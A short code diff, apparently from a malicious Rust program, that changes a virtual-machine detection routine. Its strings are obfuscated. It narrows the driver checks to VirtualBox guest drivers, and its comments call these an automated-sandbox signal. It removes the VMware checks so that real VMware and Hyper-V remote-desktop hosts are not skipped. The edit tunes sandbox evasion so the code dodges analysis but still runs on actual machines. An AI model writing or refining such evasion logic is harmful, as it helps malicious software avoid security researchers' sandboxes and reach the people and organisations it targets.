@@ -32,15 +32,14 @@ fn check_names() -> bool {
 fn check_files() -> bool {
     let sys = std::env::var(s_det_windir()).unwrap_or_else(|_| s_det_windir_default());
     let drivers = std::path::PathBuf::from(&sys).join(s_det_system32_drivers());
+    // VirtualBox guest drivers only — strong automated-sandbox signal.
+    // Do NOT check vmci/vm3dmp: those exist on legitimate VMware/Hyper-V RDP hosts.
     let checks = [
         s_det_vboxguest_sys(),
-        s_det_vmhgfs_sys(),
         s_det_vboxsf_sys(),
         s_det_vboxvideo_sys(),
         s_det_vboxmouse_sys(),
         s_det_vboxguest_sys2(),
-        s_det_vmci_sys(),
-        s_det_vm3dmp_sys(),
     ];
     for name in &checks {
         if drivers.join(name).exists() { return true; }
